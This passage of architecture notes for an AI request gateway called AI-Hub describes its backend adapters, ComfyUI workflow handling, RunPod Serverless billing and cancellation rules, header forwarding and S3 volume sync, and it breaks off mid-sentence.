# Architecture notes

The detailed design reference of AI-Hub: per module, what it does, the rules it keeps
and WHY — most rules here exist because breaking them fails silently, and many name
the measurement that found them. `CLAUDE.md` is the short map; this file is where to
look (grep the symbol) before changing a mechanism. Moved out of `CLAUDE.md` on
2026-10-02 unchanged apart from headings. Keep it current when a mechanism changes.

## Contents

- [Modules](#modules): [main.py](#mainpy), [adapters.py](#adapterspy), [RunPod Serverless](#runpod-serverless-runpodadapter), [RunPod volume sync](#runpod-volume-sync-rpvolume--s3vol), [meshy.py](#meshypy), [cloudtask.py](#cloudtaskpy), [tripo.py](#tripopy), [faults.py](#faultspy), [jobs.py](#jobspy), [store.py](#storepy), [admin.py](#adminpy), [Media statistics](#media-statistics--the-job-store-not-the-call-log), [stats.py](#statspy), [responses_bridge.py](#responses_bridgepy), [anthropic_bridge.py](#anthropic_bridgepy), [openai_image_bridge.py](#openai_image_bridgepy), [reasoning.py](#reasoningpy), [previewanim.py](#previewanimpy), [netscan.py](#netscanpy), [Managed hosts](#managed-hosts), [thunder.py](#thunderpy), [hostapi.py](#hostapipy), [services.py](#servicespy), [sshrun.py](#sshrunpy), [hostctl.py](#hostctlpy), [modelsync.py](#modelsyncpy), [loratags.py](#loratagspy), [Model sources](#model-sources), [ops/](#ops)
- [Request flow](#request-flow)
- [Routing rules](#routing-rules-resolve_routesget_gen_routes--alias_entry)
- [Auth / multi-user](#auth--multi-user)
- [Stats recording](#stats-recording)
- [Voice cloning](#voice-cloning-v1audiospeech)
- [Tests — what each one guards](#tests--what-each-one-guards)

## Modules

### `main.py`

Config loading, health/discovery loop, routing, all HTTP
endpoints, auth/quotas, call parking, generation orchestration, the Responses
bridge. Module-level globals are the entire app state: config-bound
(`backends`, `virtual_models`), discovery-bound (`backend_models`,
`backend_pricing`, `backend_loras`, `backend_healthy`), live (`backend_inflight`,
`_gen_tasks`, `users`/`_users_by_key`), and `backend_adapters`. `load_config()`
rebinds config globals, `refresh_backend()` populates discovery ones, and
`build_backend_adapters()` (re)binds one adapter per backend — keeping the INSTANCE
of a backend whose settings did not change and handing a changed one's runtime state
to its replacement (`adapter.adopt_state`: ComfyUI's restart cooldown, the running
jobs' prompt registry, and while the URL holds the slot-type cache and watchdog; a
cloud adapter's balance while url+key hold). Rebuilding everything on every save reset
the auto-restart cooldown and orphaned the prompts of running jobs. A save that lands
while a discovery poll is in flight: `refresh_backend` hands what the poll wrote onto
the replaced instance to the current one (`adopt_discovery`, same URL/account rules)
and continues on the current one.

### `adapters.py`

The pluggable per-backend protocol seam. `BackendAdapter`
ABC; `OpenAIAdapter` (`dispatch()` forwards chat/completions/embeddings,
owns the in-flight counter incl. the streamed-`finally` decrement; streamed
chat SSE is rewritten to strict OpenAI shape by `_StreamNormalizer` — no
null-valued delta keys, the terminal usage chunk only for clients that sent
`stream_options.include_usage`; strict clients like Hermes abort on the raw
LocalAI shape; a backend's `stream_reasoning_as_content` model-globs relabel
stream `reasoning` deltas as `content` — LocalAI marks EVERY delta as
reasoning when the rendered prompt contains a thinking marker, e.g. Gemma-4's
pre-closed `<|channel>thought` tail, although the model can only emit plain
answer text then) and
`ComfyUIAdapter` (`type: comfyui`; `discover()` via `/object_info` →
models + **installed LoRAs** (the MB-sized body parsed in a worker thread,
`_parse_object_info` — never on the loop; `test_comfy_discover.py`), plus an
**executor watchdog** via `/queue`:
same head prompt pending with an idle executor across ≥2 checks and
≥`stuck_after_s` (default 90) → `ComfyExecutorStuck` → the normal DOWN path
in `refresh_backend` (ComfyUI answers HTTP even when its prompt worker died —
measured 2026-07-30, CUDA fault); `restart()` = ComfyUI-Manager
`/manager/reboot` (transport error on the POST is the expected success
signal, 404 = Manager missing, then ≤120 s wait for `/object_info` to
return); `refresh_backend` triggers opt-in `auto_restart` per backend
(`restart_cooldown_s`, default 600, one attempt per cooldown,
`_comfy_restarting` guard; deliberately not gated on inflight — stuck means
nothing executes). `exec_stuck`/`last_restart*` surface in `/health` + the
Backends tab (⟳ restart action). `generate()` submits a parametrised
workflow, polls `/history` every `poll_interval` (default 1) until the backend's
`max_wait` (default 600) — the gateway's cap on ONE generation; ComfyUI itself has
none — then stops its prompt and raises `TimeoutError`, and fetches `/view`. Every
stop goes through `_stop_prompt`, which is TARGETED: a bare `/interrupt` stops
whatever executes, and a cancel or `max_wait` of a prompt still WAITING killed a
stranger's run (which then failed over, or was charged an execution fault). It asks
`/queue` first — ours running → `/interrupt {"prompt_id"}` (current ComfyUI checks the
id, an older one ignores it, and ours is the running one), pending → `/queue
{"delete":[id]}`, gone or `/queue` unreadable → nothing. `generate()` registers
`_prompts[job_id]` while it polls and stops its own prompt when the worker task is
CANCELLED; a history entry carrying `execution_interrupted` (someone stopped it on the
box) raises `ComfyPromptInterrupted`, which `_run_job` ends the job on — no failover,
no execution fault. `test_gen_cancel.py`. Both
fields are edited in the Backends tab: a store backend replaces a same-named config
entry WHOLESALE (`rebuild_backends`), so config.yaml cannot supply them for a
UI-managed backend. `TimeoutError` sits in `_GEN_FAILOVER_ERRORS` so it fails over,
but `_fault_label`/`_gen_exhausted_msg` keep it NAMED apart from a real connection
fault and from an httpx transport timeout — reporting a `max_wait` expiry as
"unreachable (connection)" sends you diagnosing the network instead of the
workflow, and the cap is spent PER CANDIDATE.) `AdapterContext` injects app services.
`AnthropicAdapter` (`type: anthropic`, subclasses `OpenAIAdapter`) serves
**`/v1/messages` only** — a licence boundary enforced in routing
(`main.serves_path`), not just documented: a Claude subscription token covers
Claude Code, not re-serving Claude as an API. It is a VERBATIM passthrough, so
three things that run for every other backend must not run there —
`_StreamNormalizer`, `apply_reasoning()` and `sampling_defaults` — else
`cache_control` breakpoints (full-price context re-reads without them), thinking
signatures and fine-grained tool streaming are lost. The three seams that make
this a subclass instead of a fork: `_payload()` (verbatim vs. sampling+reasoning),
`_backend_auth()` (`x-api-key` vs. OAuth bearer + `oauth-2025-04-20` beta appended
to the CLIENT's beta list) and `_usage_of()` (`input_tokens`/`output_tokens`
incl. cache reads, else every subscription call books 0 tokens). The same
`OpenAIAdapter` also serves `/v1/messages` for chat backends by calling
`anthropic_bridge` in both directions, which is what lets ONE alias hold an
Anthropic backend AND an OpenRouter model with normal failover between them.
`_HOP_BY_HOP` drops `x-api-key` alongside `authorization` — both are GATEWAY
credentials (Claude Code sends the former), and forwarding either would hand the
caller's key to the backend. `_forward_headers` applies it (the one site that copies
client headers) and also drops RFC 7230 hop-by-hop headers (plus whatever
`connection` names), `expect`, `accept-encoding` (httpx negotiates what it can
decode — a browser's `br` came back as a body the gateway could not read), and what
identifies the client to a third party: `cookie`, `forwarded`/`x-forwarded-*`/
`x-real-ip`/`via`, `origin`/`referer`/`sec-*`, `x-source`. It stays a DENYLIST on
purpose: the Anthropic passthrough relies on whatever Claude Code sends
(`anthropic-*`, `x-stainless-*`, `x-app`, user-agent) and OpenRouter reads
`HTTP-Referer`/`X-Title` — an allowlist would silently strip the next such header.
The outgoing body is serialized ONCE (`OpenAIAdapter._encode`, compact UTF-8 like
httpx's own encoder): sent as `content=` bytes, not `json=` (which serialized it a
second time), and the same text is the stats row's request body — a multi-MB Claude
Code context cost ~25-30 ms/MB of event loop per pass. `stats._preview` likewise
collapses only the two ends it shows, never the whole body.
Going the other way, every response builder keeps only its OWN headers
(`call.rheaders` = `x-gateway-backend` + `x-reasoning-control`; a builder that
re-wraps a dispatch response — both bridges, `main.responses` streamed and plain —
copies them with `_gateway_headers`) — an upstream
`content-length` would describe a body the gateway re-serializes — with ONE
exception: `_ratelimit_headers()` carries the upstream's `retry-after` through,
because that header is not diagnostics but an instruction to the caller. It is
merged in at every place that rebuilds a response from an upstream one
(`_dispatch_once`, both stream error paths, `_anthropic_error`, and the two
HTTPException re-raises in `main.responses` — plain and streamed), covered by
`test_ratelimit_headers.py`. Dropping it fails silently — the client still gets
its 429 and just retries blind: measured 2026-09-01 on prod, one Claude Code
request became ~10 upstream calls in 20 s against `api.anthropic.com`, which had
said exactly how long to wait.
Workflow injection is **mapping-driven, convention-free** (`_apply_mapping`
sets `workflow[node].inputs[field]` — never to a list, which ComfyUI reads as a LINK,
and to an object only where the workflow holds one; `main._client_param_refusal` 400s
such values up front, and a client string for a mapped FILE field (`is_file_param`: a
name ending in `path` or a `_FILE_FIELDS` field — NOT "mesh" anywhere, which caught
`mesh_format`/`remesh_mode` enums) whose VALUE names a file (`looks_like_path`: a
separator, `~`, or an extension — a bare `x.glb` resolves in the shared input dir), i.e.
a path on the backend box, another job's output included, unless `_params_trusted`
(an admin key via `gate_request`'s `gw_admin`, or bootstrap-open — the console's
playground qualifies through its self-call's admin key, not by a /ui rule) or the
entry carries `client_path: true` (Mapping editor checkbox *client may send a backend
path* on every file row; unticked = cleared);
judged over the alias's AND its successor's mapping, since params are threaded by
label — `test_mapping_values.py`); a mapping `label` is the param's public
API name — incoming values are accepted under label OR param, and the
auto-random seed keys on that effective name (`''` counts as unset);
`_apply_lora_cascade` drops client LoRAs into free stack slots; `_apply_fixed`
applies admin pins (the API can't override a pinned `(node,field)`);
`_apply_bypass` runs LAST (per-backend `bypass` node ids): ComfyUI mode-4 —
remove each node and reconnect its consumers to the same-typed input (k-th
same-typed output → k-th same-typed link input, via cached `/object_info`
slot types; single-link fallback when types are unknown);
an image slot mapped `on_empty: disable` and left empty prunes a whole DEAD
BRANCH (`_prune_branch`, not just the loader): the cascade follows consumers that
lose a **required** input — ComfyUI aborts the prompt on one, so they cannot run
either — and stops at an **optional** socket, which is the point of the mode
(measured 2026-08-30 on trellis2-multiview: the back loader's
`Trellis2PreProcessImage.image` is required and must go, the generator's
`back_image` is optional and stays). `required` per class comes from the same
`/object_info` cache the bypass rewiring uses (`_node_type_entry`'s `req`), loaded
only when such a slot is actually empty; an unknown class stops the cascade
(pre-cascade behaviour — never guess what a node needs). A branch that would take
the alias's `output_node` with it fails the job UP FRONT naming the slot, instead
of submitting a workflow that cannot deliver. The same slot's `on_empty_bypass`
(`slot_empty_bypass`, Mapping's *also bypass* field) names main-path nodes that
only exist for that image; those are BYPASSED, not pruned (pruning cuts the path
behind them), by joining `req.bypass` for the single `_apply_bypass` pass, so both
sources dedupe, chain-resolve and report together under `bypassed`. The cascade
never enters a listed node, EVEN over a required socket (`_prune_branch(keep=)`):
otherwise it pruned the node before the bypass ran and followed on to the output —
measured 2026-09-24, Qwen2.1: ColorMatchV2's required `image_ref` took the only
PreviewImage along, "Prompt has no outputs" on every text-only request;
**Live progress** (`_ws_progress` + the pure `_progress_apply`/`_progress_view`):
REST cannot say how far along a run is — `/queue` names the running prompt and
`/history` appears only once it is over — so the job view had to estimate from the
median of past runs. The sampler's own step counter (the `25/35` ComfyUI prints) is
published on the **websocket** only: `progress` `{value,max,node,prompt_id}` and
`progress_state` `{nodes:{id:{value,max,state}}}`. `generate()` submits with a
`client_id` and a task connects to `/ws?clientId=` with the SAME id — 0.30 broadcasts
progress to every listener, 0.34 measurably does not (2026-09-03), and the id is what
works on both. Every message carries a `prompt_id` and one that is not ours is
DROPPED: under 0.30's broadcast a job would otherwise display a stranger's steps,
which is worse than showing none. It runs BESIDE the `/history` poll, never instead
of it (the poll still owns outcome, timeout, disconnect grace and failover), is
cancelled in a `finally`, and reports `None` at the end so a finished row cannot keep
a stale "25/35". Any failure — no `websockets` (it ships with `uvicorn[standard]`,
like watchfiles), a refused socket, an unknown shape — silently leaves the median
estimate in place. The ETA is derived from the seconds per step measured in THIS run,
timed from the FIRST step and restarted whenever the node changes or the counter goes
backwards: timing from submit charges the model load to step one and predicted 250 s
for a job that took 15 (measured 2026-09-04). Fed to `main.gen_progress` via
`ctx.note_progress(job_id, …)` (in memory — it updates several times a second and a
restart forgets it, which is correct); `_job_view` prefers it (`progress_basis:
"live"`) over the median, and the console shows `running 25/35`, `~8.9 min left` and
a bar on the job page. Covered by `test_ws_progress.py`.
`suggest_mapping()` is only an auto-detect pre-fill. ComfyUI `/prompt`
rejections are translated to readable per-node errors (node title, class,
field, offending request param) via `_comfy_prompt_error`; raw body stays the
fallback. Artifact delivery: a `/view` 404 means "file absent" (probe on), any
OTHER status raises — a backend error must never silently shrink a delivery;
`output_ext` prefers the same-stem sibling but ships the reported file when the
sibling is missing; `output_cases` fetches a case ONCE and checks the detect
glob on the result; plain `output_globs` may accompany cases OR an
`output_node` as unconditional extras (the node's result stays authoritative:
an empty node still errors, never an extras-only delivery; globs WITHOUT a
node are the whole delivery). A relative `/view` path keeps its dirs as the
subfolder (`_view_params`).
`normalize_delivery` (case mode + chain level, normalize-once flagged; it,
`validate_delivery` and `_check_glb_not_dummy` are PIL work and run via
`asyncio.to_thread`, never on the loop) V-flips
generic texture PNGs and — alias Output option `texture_format: jpeg` —
transcodes them to JPEG q90 (real alpha keeps PNG; ComfyUI has no JPEG export).
**Input isolation** (`upload_prefix` on `NormalizedRequest`, `upload_prefix_for`
+ `upload_slot_name`): EVERY uploaded input is named `gw_<job id>[_s1|_s2]_<param>
.<ext>` — no two jobs share input state, ever. ComfyUI reads an input file at
EXECUTION time, so a shared name is a corruption window the gateway's one-slot
cap does NOT close (a poll timeout frees the slot while the prompt runs on) —
measured 2026-08: a client job was delivered another subject's mesh. A blank
prefix mints a random one; never add a shared fallback. `_upload_image` RAISES
on failure (silently keeping the intended name meant running on foreign bytes);
only `_upload_placeholder` is best-effort, because `gw_placeholder.png` is a
shared CONSTANT. `_cleanup_uploads` overwrites the job's inputs with that 72-byte
placeholder after a CLEAN success only (a timed-out prompt may still read them);
it never raises.
A failed run returns no `GenOutput`, so the job meta every cloud success carries would
be lost exactly when it is needed: `_create` therefore records each task on the REQUEST
(`NormalizedRequest.cloud_trace`, per-request so concurrent jobs cannot overwrite each
other) under the SAME keys the success meta uses — `cloud`, `cloud_task_id`, `endpoint`,
`request`, `tasks` — and `main._gen_fail_meta`/`_run_chain`'s `fail_meta()` put them on
the failed row (a cloud stage 2 at top level, stage 1 under `chain_stage1`, mirroring
success). `admin._cloud_table` then renders a failed run with no special case. Recording
from `_create` and not from each `_run` is what makes it unforgettable — Tripo's converts
and clips pass through there too; those carry a `role` and join `tasks` WITHOUT claiming
`cloud_task_id`/`endpoint`, which name the primary task on both paths. No `credits` is
ever guessed onto a failed row: only a poll knows what was consumed.
`CloudTaskAdapter` (`cloud = True`, `serves_generation = True`) is the vendor-NEUTRAL
half of every cloud task backend — `MeshyAdapter` and `TripoAdapter` are subclasses,
and a third vendor is a subclass plus a pure module, not a second copy of the
~60 sites Meshy used to be wired into. It owns the in-flight slot (incl. the `finally`
decrement and `slot_held` for chain stages), `generate()` (run → download every
`state.downloads` in order → thumbnail outside the rig endpoint → the job meta),
`_create` (serialise ONCE — to bytes, in a worker thread, like Meshy's body build: a
rigging body is ~93 MB of base64 and dumping it on the loop stalled every request —
size-scaled timeout ≈ 4 s/MiB — a 93 MB body once died on
the 30 s client timeout with an EMPTY `str(e)`), `_poll` (a 4xx, or a 200 whose BODY
refuses the task, is a verdict about the TASK: three IN A ROW → final; transport
errors, 5xx and 429 are about the SERVICE and get `disconnect_grace` — a poll-rate
429 must not end a task that is running and already paid for; every parsed poll feeds
the vendor's percentage to `ctx.note_progress` as step N/100 — `_note_cloud_progress`,
keyed by the `_CLOUD_JOB` ContextVar `generate()` sets per request and clears with
`None` at the end), `_download` (NO auth
header: signed CDN urls, the bearer must not leak there) and the three chain hooks.
A subclass supplies only `discover`, `_run` (build → create → poll, plus whatever
follow-up tasks the vendor needs, returning `RunResult`), `_task_request`,
`_task_body`, `_classify_create` (→ `nocredits`/`busy`/`server`/`rejected`/None),
`_task_id_of` and `_msg`. The kind seam `main`/`admin` ask instead of `== "meshy"`:
`cloud_kind(cand)` (the key its block sits under, None = ComfyUI candidate),
`cand_kind`/`backend_kind` (a candidate may run on a backend iff they are EQUAL —
backends are keyed `(name, type)`, so a bare-name match could hand a Meshy alias the
GPU box), `cloud_module(kind)`, `cloud_block(cand)` (a COPY — the request must not
write through into the stored candidate) and the derived `CLOUD_TYPES`/
`CLOUD_MODULES`. `NormalizedRequest.cloud` carries that block, and the vendor-neutral
`CloudNoCredits`/`CloudBusy` (the pre-Tripo `Meshy*` names and the `.meshy` request
field are gone — nothing stored carries them; the candidate's `meshy` KEY is the kind
and stays) have a `vendor` attribute that `main._fault_label`/`_gen_exhausted_msg` name.

**The build/execute/deliver seam** (`ComfyUIAdapter.generate`). What used to be one
method is three steps so a second backend can reuse the first: `_build_prompt(req, io)`
→ `BuiltPrompt` (the final workflow after `_apply_mapping`/`_apply_lora_cascade`/
`_apply_fixed`/`_apply_bypass`, the mapping, the job summary, the input names written),
`_execute(req, built, client)` → `(outputs, fetch, extra_meta)` (submit and wait) and
`_deliver(req, wf, outputs, fetch)` (cases / node / globs, normalisation, validation —
every file read through `fetch(params)` → `(status, bytes)`, 404 = absent, exactly the
`/view` contract). Every backend I/O of the build sits behind a per-REQUEST `GenIO`
(`put_image`/`put_file`/`placeholder`/`name_refusal`/`input_ref`/`node_types`/
`cleanup`; never stored on the adapter — concurrent jobs must not share inputs):
`ComfyIO` is the old upload/`/object_info` code unchanged, `RunpodIO` collects inputs
into the `/run` payload. WHY a seam and not a copy: a local and a RunPod candidate of
one alias must run the SAME workflow, or one alias renders two different pictures
depending on where it ran — and nothing shows it, since every workflow is valid.
`tests/test_gen_build.py` pins the built workflow byte for byte against the pre-split
output.

### RunPod Serverless (`RunpodAdapter`)

`type: runpod` (subclass of `ComfyUIAdapter`, `bills = True`, `serves_generation`) runs
the alias's ComfyUI workflow on a RunPod Serverless endpoint. The build is ComfyUI's
(`_build_prompt` through `RunpodIO`), so mapping, pins, LoRA cascade, bypass and prune
behave identically; what differs is HOW it runs. `url` must be
`https://api.runpod.ai/v2/<endpoint id>` (`runpod_endpoint_id`; `_rp_check_url` refuses
anything else before a byte is sent, and the console refuses it on Save) because the API
key travels as a bearer header and may only ever reach api.runpod.ai. `BILLING_TYPES`
(derived from `bills`) makes `main.rebuild_backends` force `paid` like the cloud kinds —
the scheduler then reaches for RunPod only when no unpaid backend is free — and
`_execution_fault`-style bookkeeping treats it like a ComfyUI box: fail rate and the
exec-fault quarantine show for `comfyui` and `runpod` alike (`quarantined` changes
routing, so it must be visible), while the executor-watchdog and restart fields do not
exist for it (`restart()` raises).

**The job.** `_execute` serialises ONE payload in a worker thread —
`{"input": {"op": "prompt", workflow, inputs: [{name, b64}], deliver: {sibling_exts},
gw_job}, "policy": {executionTimeout: max_wait·1000, ttl: (max_wait+queue_max_s)·1000}}`
— and refuses above `_RP_INPUT_MAX` (9 MB of the 10 MB `/run` allows; base64 only, no
bucket upload in M1) BEFORE anything is billed. Inputs whose file names the worker's
`NAME_RE` would refuse (`upload_slot_name` keeps any `isalnum` character, unicode
letters included) fail in `RunpodIO.name_refusal` at build time, naming the param — the
alternative was a refusal inside the worker after `/run` was paid. Placeholder:
`gw_placeholder.png` is baked into the image (`placeholder()` returns the name, nothing
uploaded); node types come from the probe snapshot. `_submit` POSTs `/run`, `_poll_rp`
polls `/status/<id>`, `_cancel_settle` ends it. Status table: `COMPLETED` → the result;
`FAILED` → `RuntimeError` with the worker's text; `CANCELLED` → `ComfyPromptInterrupted`
(ends the job, no failover, no fault); `TIMED_OUT` with no `executionTime` → `CloudBusy`
(no worker ever took it, free, fails over) else the endpoint's execution timeout; a
`/status` 404 → the job expired at RunPod (ttl). Transport errors, 429, 5xx and an
unreadable 200 are about the SERVICE and get `disconnect_grace` of continuous failure; a
4xx three times in a row is a verdict about the job and ends in a cancel attempt (not a
bare raise — the job may still run). Progress: `IN_QUEUE` → "queued at RunPod"; a
worker's `output.step/steps` → the live bar.

**Two clocks** (`_poll_rp`): the queue phase is bounded by `queue_max_s` (default 300; a
still-queued job — no CUDA-13 host free — is cancelled, which is free, and fails over as
`CloudBusy`), and `max_wait` counts EXECUTION only, from the first `IN_PROGRESS`, like
RunPod's own `executionTimeout`; the hard end is `queue_max_s + max_wait` = the job's
ttl. Counted from submit, a cold start's queue plus image boot ate the execution budget
and the gateway gave up on a job RunPod would have let finish.

**Billing rules** — the point of the class; `main._billed_cloud_task` reads the trace
`_submit` writes into `req.cloud_trace` (`runpod`, `runpod_job_id`, `runpod_settled`,
`create_unconfirmed`) and its RunPod branch makes `_run_job` end the job instead of
failing over. A `/run` that was refused (connect error, 5xx, 429) created nothing →
normal failover. A `/run` whose answer was lost, or a 2xx without a readable id, sets
`create_unconfirmed` → FINAL, and that key wins in the predicate over any settled earlier
job (the orphan ends by its own ttl). Once the id is known, every give-up path (poll
grace, `max_wait`, the queue cap, three 4xx, a cancelled task) sends `/cancel` first;
only a confirmed end — `CANCELLED`, a terminal `/status`, a 404 — sets
`runpod_settled`, and only a settled job may be re-run elsewhere; otherwise the row says
the job may still be running. A job that `COMPLETED` while being given up is DELIVERED
(`_cancel_settle` returns the status whole): its work is done and paid, and an error
about a success throws it away. The trace is reset per `/run` (`_submit` pops the three
keys) because a request is reused across self-retries — a settled attempt 1 must not
hide a lost answer of attempt 2. A cancelled gateway job cancels its RunPod job in the
`CancelledError` arm of `_execute`; `adapter.cancel(job_id)` uses `_rp_jobs`
(gateway job → `(url, RunPod id)` — the URL because a save may repoint the backend while
the job runs). At startup `jobs.reconcile_orphans` remembers the rows it failed
(`jobs.last_orphans()`) and `main._cancel_orphaned_runpod` cancels each one whose meta
names a `runpod_job_id` — on the endpoint the row names (`runpod_endpoint`, written with
the id by `ctx.note_job_meta`, best effort), not the backend's current url — and records
`runpod_cancelled_at_restart`; the console shows an unconfirmed one in bold.

`run_op` runs volume fetch/link jobs through the same submission, polling and
cancellation lifecycle. It persists the writer job id through `on_id` before polling
and cancels if saving fails; `job_status` supports restart recovery. An injected live
account key backs an empty backend key, with the RunPod URL guard before requests.

**Delivery.** The worker (`ops/runpod/handler.py`) runs the prompt on the in-container
ComfyUI and returns `outputs` plus a `manifest` `{<type>/<subfolder>/<file>: {b64, size,
sha256} | null}` of every file the outputs name and each requested sibling extension
(`deliver.sibling_exts`, derived by `_sibling_exts` from `output_ext`/globs/cases). The
adapter's `fetch` reads the manifest instead of `/view` (absent → 404, so
`_fetch_outputs`/`_fetch_by_cases` behave unchanged), verifies size and sha256 (damage is
a raise, never a smaller delivery), and the worker refuses past `OUT_MAX_B64` (7 MB —
`/run` results cap at 10 MB). M1 therefore delivers images and small files; 3D and video
need the bucket upload of a later milestone. The job meta carries `runpod_job_id`,
`delay_ms` (queue + cold start), `execution_ms`, `worker_version` and, with
`cost_per_hour`, `cost_est_usd` — execution only, a LOWER bound (boot, model load and the
endpoint's idle timeout bill too; `cost_basis` says so). `admin._runpod_table` renders it.

**Discovery never runs a job** (that costs money). `discover()` reads `/health` (workers,
queue) and the REST endpoint record (`workersMax`, GPUs, `allowedCudaVersions`);
`workersMax 0` — RunPod's silent scale-down after 7 idle days — is DOWN with that cause,
401/403 name the key. Models, LoRAs and node types come from the **probe snapshot**: the
console's Probe button (`POST /ui/backends/runpod-probe` → `main.runpod_probe`) submits
one `op: info` job (a cold start — also the real-GPU smoke test of a new image) and
stores `{at, worker_version, endpoint, object_info_gz, models}` in the bulk setting
`runpod_probe` (per backend NAME; `store._BULK_SETTINGS`, never in `get_settings()`). A
record whose `endpoint` is not this backend's endpoint id is IGNORED (a changed url or a
reused name describes another image). `RunpodAdapter` keeps `object_info_full`, which
`admin._object_info` answers the mapping editor's widgets from — the endpoint has no
`/object_info` of its own — and `adopt_state`/`adopt_discovery`/`adopt_probe` keep the
snapshot, the running jobs and a probe finished on a replaced instance across a save
(a copied `running` probe state would stay `running` for good and the tab live forever;
`_settled_probe`). `/health` and the Backends tab carry `runpod` (idle/running workers,
queue, max workers, probe state).

**Fences.** A RunPod backend refuses every chain role (`chain_export` returns an error,
`chain_take_mesh`/`chain_feed_mesh` raise): the inherited ComfyUI hooks would run a
billed stage 1 and then `GET /view` on api.runpod.ai, or upload to it — failing only
after the money is spent. A name shared by a `comfyui` and a `runpod` backend is refused
on Save (`admin.backend_save`) and warned for config (`main.gen_name_clashes` /
`_warn_gen_name_clashes`): backends are keyed `(name, type)` but a workflow candidate
names its backend by NAME, so `_gen_backend_for` would pick whichever comes first and
local work could run — and bill — on RunPod. Tests: `test_gen_build.py`,
`test_runpod_adapter.py`, `test_runpod_worker.py`.

### RunPod volume sync (rpvolume / s3vol)

**Objects and wiring.** A network volume is its own store object, referenced by the
`volume` field of any number of RunPod backends. `runpod_volumes` maps names matching
`[a-z0-9-]{1,40}` to `{datacenter, size_gb, max_size_gb}`: start size 10…4000 GB,
ceiling from the start size through 4000 GB. The name is the identity (no rename);
the RunPod name is `aihub-<name>`, and DC cannot change after creation. Config start
size and persisted, possibly grown size are separate; volumes only grow.

`rpvolume.py` owns REST calls to `https://rest.runpod.io/v1` and one
`VolumeController` per volume, with every dependency injected through `VolumeDeps`.
`ensure_volume` owns adoption/creation, `resume` settles saved writers, and
`run_forever` drives planning/transfers; `view` and alias readiness/status do no I/O.
Neither it nor `s3vol.py` imports `main`, `hostctl`, `adapters` or `store`.
`main.sync_volume_controllers` follows the bulk setting, keeps the last good config
on store read errors, updates growth ceilings on edits and retains removed controllers
while fetch or multipart records remain. `runpod_volume_state` contains identity/DC,
actual size, missing-list count, saved fetch job and multipart ids, URL fallbacks and
reasons, blocked paths and cumulative sync cost/time. State saves read-modify-write
on the event loop without an await; new volume, job and upload ids are saved before
the next await, so a restart cannot buy a second volume or start a second writer.
Neither bulk setting enters `get_settings()`.

The account key (`runpod`) and S3 credentials (`runpod_s3`, encrypted as `<access
id>:<secret>`, exactly one colon and no whitespace) are provider-token kinds, not
hosting providers. They never enter rendered views, logs, argv or job inputs. The
account key also backs an empty backend `api_key` through the adapter's injected
callable. Fetch/status/cancel resolve the live adapter; fetch accepts a transfer
budget override and otherwise uses the backend max wait; volume faults use backend
`volume:<name>` and source `volume`.

**S3.** `s3vol.py` uses stdlib SigV4 and an injected httpx client, with no new
dependency. The endpoint is `https://s3api-<dc lower>.runpod.io`, bucket is the
volume id, path-style `/<volume id>/<key>`, and signing region is the lower-case DC
id. Raw path segments and query fields share encoders with the request URL; paths
are encoded once without normalizing model names. Every request signs its payload
hash; payloads of at least 1 MiB are hashed in a worker thread so multipart signing
cannot stall requests. Namespace-tolerant XML readers preserve continuation tokens,
upload ids and errors; ListV2 follows every page so keys past 1000 are not silently
lost. Missing reads return `None`, missing deletes/aborts count as done. Completion
has a 900-second timeout (other requests 60 seconds), and error XML is checked even
under HTTP 200. Authentication has a distinct `S3AuthError`; puts and multipart
parts refuse buffers of 500,000,000 bytes or more.

**Plan round and money.** The controller merges alias needs across enabled
referencing backends through the shared, pure `modelsync.plan()`. It reads
`models/`, `hf-cache/` and `.gw-modelsync.json` over S3; `.gw-part` leftovers stay
outside the planning index but count toward used bytes and appear as selectable
cleanup rows on the card. Manifest links override listing sizes. An unreadable
manifest warns and becomes empty: its files are unknown, never automatically
deleted. No referencing backend means idle, with nothing pruned. Needs and the
change signature's store reads run in a worker thread.

Missing bytes count only non-link fetch entries that are neither blocked nor already
present at the planned size in the current destination. Unknown sizes count zero
until a URL HEAD supplies a size or a completed job is verified by S3 HEAD. When
used bytes plus missing bytes exceed 95% of provisioned capacity, only
manifest-owned prune candidates may be removed, with manifest updates after each
delete. Unknown files still consume space. If that is insufficient, growth targets
`ceil((used + missing) * 1.10 / 10**9)` GB, capped by `max_size_gb`; aliases whose
remaining needs cannot fit are blocked with “needs X GB, limit Y GB”. Deleting files
does not lower the bill: provisioned GB cost $0.07/GB/month. Growth logs old/new GB
and monthly cost through `note_fault(kind, detail)`.

Creation first lists volumes and adopts a matching `aihub-<name>` in the right DC,
including after a lost create answer; an absent volume has no id to validate yet. A
saved id is gone only after two successful lists without it. Recreation requires
explicit Sync now and confirmation that a new empty volume will be billed. Growth,
volume deletion and S3 cleanup require an id in a fresh list with matching name/DC.
Growth never shrinks or exceeds the ceiling. Volume deletion refuses every backend
reference (including disabled backends, checked again after the list awaits) and
pending writers. Deleting a never-created volume or one confirmed gone from two
lists removes its config and saved state without a REST DELETE.

**Volume transfers.** URL catalog / HF-auto files use a fetch job; other files use a
LAN stream. Fetch batches preserve plan order, normally at most `20 * 10**9` bytes
and 50 files, one job per volume. `JOB_BYTES` bounds a batch, not a file: a larger
file goes alone and its `.gw-part` can resume across jobs. Catalog-only files with
unknown size try a capacity-checked Content-Length from a URL HEAD. HEAD failures
(including 4xx/405) and absent lengths mean unknown size, cached for ten minutes;
successful sizes are cached by URL until Sync now. An unknown-size item goes alone
with `size: null`; only its optional hash is checked by the worker, and the S3 HEAD
size becomes the manifest size. The gateway HF token goes only on this size HEAD to
`huggingface.co`, its subdomains or `hf.co`; httpx strips it on a cross-origin CDN
redirect. Worker downloads instead use endpoint-env `HF_TOKEN`, never job input.

Jobs use the first enabled referencing backend sorted by name; without one, URL
files wait for an endpoint. Fetch job ids, endpoint/backend, items including alias
ownership, and `budget_s` are saved before polling. Downloads use `max(600,
min(4*3600, total_bytes / 20e6 + 300))` seconds, or four hours for an unknown-size
item, passed through main to `run_op`. Every successful item needs an independent S3
HEAD before acquiring manifest ownership. Only an explicit per-item `ok: false`
consumes an attempt. Three item failures or a worker `final:` error record a LAN
fallback; without a share copy the path is blocked and a fault recorded. Job-level
failure, missing results or failed S3 verification clears the settled job and backs
off with a visible problem; it does not sacrifice every URL in a batch. Execution
cost is `execution_ms / 3.6e6 * cost_per_hour`, accumulated in `sync_cost_usd`.

One LAN stream runs per volume, using the shared LanSource hash slot (transfer hash
has priority). Files below `PART_SIZE = 128 * 1024 * 1024` use a single put; others
save the multipart id before streaming `cat_argv(path, 0)` into 128 MiB parts. Byte
count, subprocess exit and sha256 must match the share hash before completion; an
independent HEAD must match before manifest ownership. Failure aborts the upload; a
